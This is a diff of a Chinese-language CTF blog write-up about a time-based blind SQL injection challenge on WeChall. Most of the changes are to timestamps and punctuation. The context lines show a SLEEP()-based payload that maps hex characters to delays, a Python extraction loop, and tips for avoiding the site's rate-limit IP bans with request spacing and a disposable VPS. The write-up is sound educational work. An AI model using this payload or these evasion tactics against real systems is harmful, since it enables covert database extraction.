@@ -30,7 +30,7 @@
 <meta property="og:description" content="Blinded by the Lighter 是一道 blind SQL injection 题，要求在每轮最多 33 次查询的硬限制下，连续成功 3 轮提取 32 位 hex hash，且总时间不得超过 9 分钟。核心思路是用 SLEEP() 的时间侧信道把 16 个字符映射为不同延迟，每字符仅需 1 次查询。 Challenge  每轮 33 次查询上限 需连续成功 3 轮 9 分钟时间限制（">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-07-11T10:50:38.000Z">
-<meta property="article:modified_time" content="2026-09-09T02:47:51.488Z">
+<meta property="article:modified_time" content="2026-09-15T02:08:47.160Z">
 <meta property="article:author" content="vkkkv">
 <meta property="article:tag" content="blind">
 <meta property="article:tag" content="ctf">
@@ -237,18 +237,18 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">409</span>
+          <span class="site-state-item-count">532</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">265</span>
+        <span class="site-state-item-count">348</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -321,7 +321,7 @@ p.spoiler {
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-09 10:47:51" itemprop="dateModified" datetime="2026-09-09T10:47:51+08:00">2026-09-09</time>
+      <time title="Modified: 2026-09-15 10:08:47" itemprop="dateModified" datetime="2026-09-15T10:08:47+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -385,18 +385,18 @@ p.spoiler {
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or &#x27;&#x27;=&#x27;&#x27; and (</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span>a<span class="string">&#x27;, sleep(1.2), 1) and</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span>b<span class="string">&#x27;, sleep(2.4), 1) and</span></span><br><span class="line"><span class="string">  ...</span></span><br><span class="line"><span class="string">  if(substr(password,1,1)=&#x27;</span><span class="number">9</span><span class="string">&#x27;, sleep(19.2), 1)</span></span><br><span class="line"><span class="string">)-- -</span></span><br></pre></td></tr></table></figure>
 <p><code>round(PHP_Time / 1.2)</code> → 字符索引。</p>
 <h4 id="关键细节">关键细节</h4>
-<p><strong>不能轮间 reset</strong> — <code>blightReset(true)</code>
+<p><strong>不能轮间 reset</strong>：<code>blightReset(true)</code>
 会清零 consecutive counter。<code>blightSolved()</code>
 成功提交后自动调用 <code>blightReset(false)</code> 生成新 hash
 但保留计数。所以只应在最初 reset 一次。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s.get(URL + <span class="string">&#x27;?reset=me&#x27;</span>)  <span class="comment"># 只此一次</span></span><br><span class="line"><span class="keyword">for</span> rn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">hash</span> = extract()</span><br><span class="line">    s.post(URL, &#123;<span class="string">&#x27;thehash&#x27;</span>: <span class="built_in">hash</span>, <span class="string">&#x27;mybutton&#x27;</span>: <span class="string">&#x27;Enter&#x27;</span>&#125;)</span><br><span class="line">    <span class="comment"># blightSolved() 内部已 reset(false)，无需手动</span></span><br></pre></td></tr></table></figure>
-<p><strong>STEP=1.2</strong> — 比 1.5 快（avg 10.2s vs 12.75s），比 1.0
+<p><strong>STEP=1.2</strong>：比 1.5 快（avg 10.2s vs 12.75s），比 1.0
 可靠（避免 <code>round()</code> 边界误判）。</p>
-<p><strong>requests.Session</strong> — 保持 TLS 连接，overhead
+<p><strong>requests.Session</strong>：保持 TLS 连接，overhead
 ~0.4s/req。比 curl 子进程快 30%+。</p>
-<p><strong>0.5s 请求间隔</strong> — 避免触发 WeChall 速率限制（~100
+<p><strong>0.5s 请求间隔</strong>：避免触发 WeChall 速率限制（~100
 次连续请求后 IP 封禁）。</p>
-<p><strong>Vultr VPS</strong> — 本地网络在代理后 12-15
+<p><strong>Vultr VPS</strong>：本地网络在代理后 12-15
 次请求即受限，需干净 IP。vc2-1c-1gb ($5/mo) 足够，3 轮结束即销毁。</p>
 <h4 id="实测数据">实测数据</h4>
 <table>
